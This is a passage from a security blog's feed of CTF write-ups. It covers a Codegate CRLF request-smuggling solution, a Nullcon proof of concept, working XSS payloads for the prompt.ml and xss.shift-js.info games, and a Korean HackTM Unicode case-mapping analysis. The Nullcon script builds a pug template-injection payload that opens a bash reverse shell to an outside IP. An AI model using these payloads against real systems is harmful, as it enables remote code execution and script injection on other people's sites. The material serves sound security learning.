class="line"></span><br><span class="line">[RESPONSE]</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line">    Your access log is written with ticket no 6f99f4a313a094964d38e793a99a339acdaac3be</span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>From <code>/home/src/app/__init__.py</code>, we could know the flag is stored in <code>config.FLAG</code> . So <code>&#123;&#123;"&#123;\&#123;config.Flags&#125;\&#125;"&#125;&#125;</code> template string means</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[REQUEST]</span><br><span class="line">POST /renderer/ HTTP/1.1</span><br><span class="line">Host: 110.10.147.169</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 194</span><br><span class="line"></span><br><span class="line">url=http://localhost/renderer/admin/ticket?ticket=6f99f4a313a094964d38e793a99a339acdaac3be HTTP/1.1</span><br><span class="line">Host: x</span><br><span class="line">User-Agent: AdminBrowser/1.337</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x</span><br><span class="line"></span><br><span class="line">[RESPONSE]</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;proxy-body&quot;</span>&gt;</span></span><br><span class="line">    Admin page accessed from CODEGATE2020&#123;CrLfMakesLocalGreatAgain&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&#123;&#123;"&#123;\&#123;config.Flags&#125;\&#125;"&#125;&#125;</code> can be verified by rendering templates with tickets where FLAG contents are stored. </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://https//ctftime.org/event/938&quot;&gt;https://ctftime.org/event/938&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Codegate CTF&lt;/strong&gt; is one 
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://blog.p6.is/category/writeup/"/>
    
    
      <category term="Codegate CTF" scheme="https://blog.p6.is/tags/Codegate-CTF/"/>
    
  </entry>
  
  <entry>
    <title>Nullcon HackIM 2020 - split second</title>
    <link href="https://blog.p6.is/nullcon-hackim-2020-split-second/"/>
    <id>https://blog.p6.is/nullcon-hackim-2020-split-second/</id>
    <published>2020-02-09T00:00:00.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/15.165.0.114/9999 0&gt;&amp;1&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;process.binding(&#x27;spawn_sync&#x27;).spawn(&#123;file:&#x27;bash&#x27;,args:[&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;%s&#x27;],envPairs:[&#x27;y=&#x27;],stdio:[&#123;type:&#x27;pipe&#x27;,readable:1&#125;]&#125;)&quot;</span> % (cmd)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span>.join(<span class="string">&#x27;\\&#x27;</span> + <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:] <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET /flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: x</span></span><br><span class="line"><span class="string">adminauth: secretpassword</span></span><br><span class="line"><span class="string">pug: #&#123;[][&quot;\146\151\154\164\145\162&quot;][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;](&quot;%s&quot;)()&#125;</span></span><br><span class="line"><span class="string">x:&#x27;&#x27;&#x27;</span> % (payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&#x27;0xff&#x27;</span> + <span class="built_in">hex</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:].zfill(<span class="number">2</span>), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;http://web2.ctf.nullcon.net:8081/core?q=&#x27;</span> + urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure><p>Cause of the server has closed, only the POC is attached briefly.<br>Main idea of this challenge, is unicode failure bug by the node v8 version of nodejs http module. and pug module template injection leads to remote code execution.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://blog.p6.is/category/writeup/"/>
    
    
      <category term="sandbox" scheme="https://blog.p6.is/tags/sandbox/"/>
    
  </entry>
  
  <entry>
    <title>prompt.ml Solution</title>
    <link href="https://blog.p6.is/prompt-ml-solution/"/>
    <id>https://blog.p6.is/prompt-ml-solution/</id>
    <published>2020-02-07T00:00:00.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p> This is a XSS injection game inspired by <a href="http://escape.alf.nu/">alert(1) to win</a>.</p><p> <a href="http://prompt.ml/">http://prompt.ml/</a></p></blockquote><h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;autofocus/onfocus=&quot;prompt(1)</span><br></pre></td></tr></table></figure><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=prompt(1) \</span><br></pre></td></tr></table></figure><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;Set.constructor`prompt\x281\x29```&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;&lt;img src onerror=prompt(1)</span><br></pre></td></tr></table></figure><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//prompt.ml%2f@14.rs</span><br></pre></td></tr></table></figure><h2 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; type=image src onerror</span><br><span class="line">=&quot;prompt(1)</span><br></pre></td></tr></table></figure><h2 id="0x6"><a href="#0x6" class="headerlink" title="0x6"></a>0x6</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;z&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="0x7"><a href="#0x7" class="headerlink" title="0x7"></a>0x7</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;`#`;prompt(1)`#`&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="0x8"><a href="#0x8" class="headerlink" title="0x8"></a>0x8</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[U+2028]prompt(1)[U+2028]--&gt;</span><br></pre></td></tr></table></figure><h2 id="0x9"><a href="#0x9" class="headerlink" title="0x9"></a>0x9</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ımg src onerror=[][&quot;\146\151\154\164\145\162&quot;][&quot;\143\157\156\163\164\162\165\143\164\157\162&quot;](&quot;\160\162\157\155\160\164\50\61\51&quot;)()&gt;</span><br></pre></td></tr></table></figure><h2 id="0xA"><a href="#0xA" class="headerlink" title="0xA"></a>0xA</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;(prompt(1))in&quot;</span><br></pre></td></tr></table></figure><h2 id="0xB"><a href="#0xB" class="headerlink" title="0xB"></a>0xB</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;in (prompt(1))in&quot;</span><br></pre></td></tr></table></figure><h2 id="0xC"><a href="#0xC" class="headerlink" title="0xC"></a>0xC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval((1558153217).toString(36).concat(String.fromCharCode(40).concat(1).concat(String.fromCharCode(41))))</span><br></pre></td></tr></table></figure><h2 id="0xD"><a href="#0xD" class="headerlink" title="0xD"></a>0xD</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;source&quot;:&quot;$&#x27;&lt;svg/onload=prompt(1)//&quot;&#125;,&quot;source&quot;:&quot;z*&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="0xE"><a href="#0xE" class="headerlink" title="0xE"></a>0xE</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;`#`;prompt(1)`#`&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt; This is a XSS injection game inspired by &lt;a href=&quot;http://escape.alf.nu/&quot;&gt;alert(1) to win&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt; &lt;a href=&quot;http://promp
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://blog.p6.is/category/writeup/"/>
    
    
      <category term="XSS" scheme="https://blog.p6.is/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>xss.shift-js.info Solution</title>
    <link href="https://blog.p6.is/xss-shift-js-solution/"/>
    <id>https://blog.p6.is/xss-shift-js-solution/</id>
    <published>2020-02-06T00:00:00.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>XSS Challenge</p><p><a href="http://xss.shift-js.info/">http://xss.shift-js.info/</a>  </p></blockquote><h2 id="1-Simple-XSS-1"><a href="#1-Simple-XSS-1" class="headerlink" title="1. Simple XSS 1"></a><a href="http://xss.shift-js.info/case01.php?payload=%5BXSS%5D">1. Simple XSS 1</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case01.php?payload=%3Csvg/onload=alert(%27XSS%27)%3E</span><br></pre></td></tr></table></figure><h2 id="2-Simple-XSS-2"><a href="#2-Simple-XSS-2" class="headerlink" title="2. Simple XSS 2"></a><a href="http://xss.shift-js.info/case02.php">2. Simple XSS 2</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case02.php#%3Ciframe/onload=alert(&#x27;XSS&#x27;)%3E</span><br></pre></td></tr></table></figure><h2 id="3-With-htmlspecialchars"><a href="#3-With-htmlspecialchars" class="headerlink" title="3. With htmlspecialchars()"></a><a href="http://xss.shift-js.info/case03.php?payload=%5BXSS%5D">3. With htmlspecialchars()</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case03.php?payload=javascript:alert(%27XSS%27)</span><br></pre></td></tr></table></figure><h2 id="4-1-Without-any-backquotes-and-HTML-tags"><a href="#4-1-Without-any-backquotes-and-HTML-tags" class="headerlink" title="4-1. Without any backquotes and HTML tags"></a><a href="http://xss.shift-js.info/case04-1.php?payload=%5BXSS%5D">4-1. Without any backquotes and HTML tags</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case04-1.php?payload=$&#123;alert(%27XSS%27)&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-Without-any-backquotes-HTML-tags-and-ux"><a href="#4-2-Without-any-backquotes-HTML-tags-and-ux" class="headerlink" title="[4-2. Without any backquotes, HTML tags and ux]"></a>[4-2. Without any backquotes, HTML tags and <a href="http://xss.shift-js.info/case04-2.php?payload=%5BXSS%5D">ux]</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case04-2.php?payload=$&#123;alert(%27XSS%27)&#125;</span><br></pre></td></tr></table></figure><h2 id="5-Without-any-alphabets"><a href="#5-Without-any-alphabets" class="headerlink" title="5. Without any alphabets"></a><a href="http://xss.shift-js.info/case05.php?payload=%5BXSS%5D">5. Without any alphabets</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case05.php?payload=%24%3D~%5B%5D%3B%24%3D%7B___%3A%2B%2B%24%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5B%24%5D%2C__%24%3A%2B%2B%24%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5B%24%5D%2C_%24_%3A%2B%2B%24%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5B%24%5D%2C%24%24_%24%3A(%24%5B%24%5D%2B%22%22)%5B%24%5D%2C_%24%24%3A%2B%2B%24%2C%24%24%24_%3A(!%22%22%2B%22%22)%5B%24%5D%2C%24__%3A%2B%2B%24%2C%24_%24%3A%2B%2B%24%2C%24%24__%3A(%7B%7D%2B%22%22)%5B%24%5D%2C%24%24_%3A%2B%2B%24%2C%24%24%24%3A%2B%2B%24%2C%24___%3A%2B%2B%24%2C%24__%24%3A%2B%2B%24%7D%3B%24.%24_%3D(%24.%24_%3D%24%2B%22%22)%5B%24.%24_%24%5D%2B(%24._%24%3D%24.%24_%5B%24.__%24%5D)%2B(%24.%24%24%3D(%24.%24%2B%22%22)%5B%24.__%24%5D)%2B((!%24)%2B%22%22)%5B%24._%24%24%5D%2B(%24.__%3D%24.%24_%5B%24.%24%24_%5D)%2B(%24.%24%3D(!%22%22%2B%22%22)%5B%24.__%24%5D)%2B(%24._%3D(!%22%22%2B%22%22)%5B%24._%24_%5D)%2B%24.%24_%5B%24.%24_%24%5D%2B%24.__%2B%24._%24%2B%24.%24%3B%24.%24%24%3D%24.%24%2B(!%22%22%2B%22%22)%5B%24._%24%24%5D%2B%24.__%2B%24._%2B%24.%24%2B%24.%24%24%3B%24.%24%3D(%24.___)%5B%24.%24_%5D%5B%24.%24_%5D%3B%24.%24(%24.%24(%24.%24%24%2B%22%5C%22%22%2B%24.%24_%24_%2B(!%5B%5D%2B%22%22)%5B%24._%24_%5D%2B%24.%24%24%24_%2B%22%5C%5C%22%2B%24.__%24%2B%24.%24%24_%2B%24._%24_%2B%24.__%2B%22(%27%5C%5C%22%2B%24.__%24%2B%24._%24%24%2B%24.___%2B%22%5C%5C%22%2B%24.__%24%2B%24._%24_%2B%24._%24%24%2B%22%5C%5C%22%2B%24.__%24%2B%24._%24_%2B%24._%24%24%2B%22%27)%22%2B%22%5C%22%22)())()%3B</span><br></pre></td></tr></table></figure><h2 id="6-1-Without-any-paretheses"><a href="#6-1-Without-any-paretheses" class="headerlink" title="6-1. Without any paretheses"></a><a href="http://xss.shift-js.info/case06-1.php?payload=%5BXSS%5D">6-1. Without any paretheses</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case06-1.php?payload=%3Csvg/onload=alert`XSS`%3E</span><br></pre></td></tr></table></figure><h2 id="6-2-Without-any-parentheses-and-oO-nN"><a href="#6-2-Without-any-parentheses-and-oO-nN" class="headerlink" title="[6-2. Without any parentheses and oO][nN]"></a>[6-2. Without any parentheses and <a href="http://xss.shift-js.info/case06-2.php?payload=%5BXSS%5D">oO][nN]</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case06-2.php?payload=%3Cscript%3Ealert`XSS`%3C/script%3E</span><br></pre></td></tr></table></figure><h2 id="6-3-Without-any-paretheses-and-oO-nN-http-xss-shift-js-info-case06-3-php-payload-XSS"><a href="#6-3-Without-any-paretheses-and-oO-nN-http-xss-shift-js-info-case06-3-php-payload-XSS" class="headerlink" title="[6-3. Without any paretheses and .[oO].[nN].*](http://xss.shift-js.info/case06-3.php?payload=[XSS])"></a>[6-3. Without any paretheses and .<em>[oO].</em>[nN].*](<a href="http://xss.shift-js.info/case06-3.php?payload=%5BXSS%5D">http://xss.shift-js.info/case06-3.php?payload=[XSS]</a>)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case06-3.php?payload=%3Cscript%3Ealert`XSS`%3C/script%3E</span><br></pre></td></tr></table></figure><h2 id="6-4-Without-any-paretheses-oO-nN-and-tag-attributes-http-xss-shift-js-info-case06-4-php-payload-XSS"><a href="#6-4-Without-any-paretheses-oO-nN-and-tag-attributes-http-xss-shift-js-info-case06-4-php-payload-XSS" class="headerlink" title="[6-4. Without any paretheses, .[oO].[nN].* and tag attributes](http://xss.shift-js.info/case06-4.php?payload=[XSS])"></a>[6-4. Without any paretheses, .<em>[oO].</em>[nN].* and tag attributes](<a href="http://xss.shift-js.info/case06-4.php?payload=%5BXSS%5D">http://xss.shift-js.info/case06-4.php?payload=[XSS]</a>)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case06-4.php?payload=%3Ciframe/src=javascript:alert`XSS`//</span><br></pre></td></tr></table></figure><h2 id="7-1-Without-any-quotes"><a href="#7-1-Without-any-quotes" class="headerlink" title="7-1. Without any quotes"></a><a href="http://xss.shift-js.info/case07-1.php?payload=%5BXSS%5D">7-1. Without any quotes</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case07-1.php?payload=%3Csvg/onload=alert(/XSS/.source)%3E</span><br></pre></td></tr></table></figure><h2 id="7-2-Without-any-quotes-and-amp"><a href="#7-2-Without-any-quotes-and-amp" class="headerlink" title="7-2. Without any quotes and &amp;#"></a><a href="http://xss.shift-js.info/case07-2.php?payload=%5BXSS%5D">7-2. Without any quotes and &amp;#</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case07-2.php?payload=%3Csvg/onload=alert(/XSS/.source)%3E</span><br></pre></td></tr></table></figure><h2 id="8-1-Without-any-backquotes-parentheses-and-HTML-tags"><a href="#8-1-Without-any-backquotes-parentheses-and-HTML-tags" class="headerlink" title="8-1. Without any backquotes, parentheses and HTML tags"></a><a href="http://xss.shift-js.info/case08-1.php?payload=%5BXSS%5D">8-1. Without any backquotes, parentheses and HTML tags</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case08-1.php?payload=%22%0aalert(%22XSS%22)//onmouseover=%27javascript://</span><br></pre></td></tr></table></figure><h2 id="8-2-Without-any-backquotes-parentheses-HTML-tags-and-amp"><a href="#8-2-Without-any-backquotes-parentheses-HTML-tags-and-amp" class="headerlink" title="8-2. Without any backquotes, parentheses, HTML tags and &amp;#"></a><a href="http://xss.shift-js.info/case08-2.php?payload=%5BXSS%5D">8-2. Without any backquotes, parentheses, HTML tags and &amp;#</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case08-2.php?payload=%22%0aalert(%22XSS%22)//onmouseover=%27javascript://</span><br></pre></td></tr></table></figure><h2 id="9-1-Without-any-spaces-and-script"><a href="#9-1-Without-any-spaces-and-script" class="headerlink" title="9-1. Without any spaces and script"></a><a href="http://xss.shift-js.info/case09-1.php?payload=%5BXSS%5D">9-1. Without any spaces and script</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case09-1.php?payload=%3Csvg/onload=alert(%27XSS%27)%3E</span><br></pre></td></tr></table></figure><h2 id="9-2-Without-any-spaces-and-sS-cC-rR-iI-pP-tT"><a href="#9-2-Without-any-spaces-and-sS-cC-rR-iI-pP-tT" class="headerlink" title="[9-2. Without any spaces and sS][cC][rR][iI][pP][tT]"></a>[9-2. Without any spaces and <a href="http://xss.shift-js.info/case09-2.php?payload=%5BXSS%5D">sS][cC][rR][iI][pP][tT]</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case09-2.php?payload=%3Cx/onmouseover=alert(%22XSS%22)%3E</span><br></pre></td></tr></table></figure><h2 id="20-Bad-use-of-JSONP"><a href="#20-Bad-use-of-JSONP" class="headerlink" title="20. Bad use of JSONP"></a><a href="http://xss.shift-js.info/case20.php?payload=%5BXSS%5D">20. Bad use of JSONP</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case20.php?payload=%3Cscript/src=jsonp.php?callback=alert(%27XSS%27)%3E%3C/script%3E</span><br></pre></td></tr></table></figure><h2 id="21-nonce-unsafe-eval"><a href="#21-nonce-unsafe-eval" class="headerlink" title="21. nonce + unsafe-eval"></a><a href="http://xss.shift-js.info/case21.php?payload=%5BXSS%5D">21. nonce + unsafe-eval</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case21.php?payload=%3Cinput/id=%22equation%22value=alert(%27XSS%27)%3E%3C!--</span><br></pre></td></tr></table></figure><h2 id="22-nonce-unsafe-eval"><a href="#22-nonce-unsafe-eval" class="headerlink" title="22. nonce + unsafe-eval"></a><a href="http://xss.shift-js.info/case22.php?payload=%5BXSS%5D">22. nonce + unsafe-eval</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case22.php?payload=&#123;&#123;constructor.constructor(%22alert(%27XSS%27)%22)()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="23-nonce-strict-dynamic"><a href="#23-nonce-strict-dynamic" class="headerlink" title="23. nonce + strict-dynamic"></a><a href="http://xss.shift-js.info/case23.php?payload=%5BXSS%5D">23. nonce + strict-dynamic</a></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss.shift-js.info/case23.php?payload=alert(%27XSS%27)//%3Cscript/id=injectarea%3E%3C/script%3E%3C!--</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;XSS Challenge&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://xss.shift-js.info/&quot;&gt;http://xss.shift-js.info/&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-Simple-
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://blog.p6.is/category/writeup/"/>
    
    
      <category term="XSS" scheme="https://blog.p6.is/tags/XSS/"/>
    
      <category term="CSP" scheme="https://blog.p6.is/tags/CSP/"/>
    
  </entry>
  
  <entry>
    <title>HackTM CTF Quals 2020</title>
    <link href="https://blog.p6.is/hacktm-ctf-quals-2020/"/>
    <id>https://blog.p6.is/hacktm-ctf-quals-2020/</id>
    <published>2020-02-03T00:00:00.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/956">https://ctftime.org/event/956</a></li></ul><p>WreckTheLine 팀에서 주최한 CTF 입니다.</p><h2 id="175pts-Draw-with-us-1st-solve"><a href="#175pts-Draw-with-us-1st-solve" class="headerlink" title="[175pts] Draw with us (1st solve)"></a>[175pts] <a href="#draw-with-us">Draw with us</a> (1st solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/hacktm/stripped.js">stripped.js</a></li></ul><blockquote><p> Come draw with us!<br><a href="http://167.172.165.153:60000/">http://167.172.165.153:60000/</a><br>Author: stackola<br><strong>Hint!</strong> Changing your color is the first step towards happiness. </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isValidUser</span>(<span class="params">u</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.<span class="property">username</span>.<span class="property">length</span> &gt;= <span class="number">3</span> &amp;&amp;</span><br><span class="line">    u.<span class="property">username</span>.<span class="title function_">toUpperCase</span>() !== config.<span class="property">adminUsername</span>.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>로그인 함수에서 <code>isValidUser</code> 함수를 호출하여 admin 계정으로의 로그인인지 확인합니다.<br> <code>u.username.toUpperCase() !== config.adminUsername.toUpperCase()</code> 를 만족하지 않으면 로그인인 가능합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isAdmin</span>(<span class="params">u</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> u.<span class="property">username</span>.<span class="title function_">toLowerCase</span>() == config.<span class="property">adminUsername</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>하지만 로그인 이후 관리자 페이지인 <code>/updateUser</code> 에서는 <code>isAdmin</code> 함수를 이용하여 관리자 권한을 확인하는데, 비교에 <code>String.toUpperCase</code> 를 사용하였던  <code>isValidUser</code> 와 다르게 <code>String.toLowerCase</code> 를 사용하고 있습니다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[223] ß (%C3%9F).toUpperCase() =&gt; SS (%53%53)</span><br><span class="line">[304] İ (%C4%B0).toLowerCase() =&gt; i̇ (%69%307)</span><br><span class="line">[305] ı (%C4%B1).toUpperCase() =&gt; I (%49)</span><br><span class="line">[329] ŉ (%C5%89).toUpperCase() =&gt; ʼN (%2bc%4e)</span><br><span class="line">[383] ſ (%C5%BF).toUpperCase() =&gt; S (%53)</span><br><span class="line">[496] ǰ (%C7%B0).toUpperCase() =&gt; J̌ (%4a%30c)</span><br><span class="line">[7830] ẖ (%E1%BA%96).toUpperCase() =&gt; H̱ 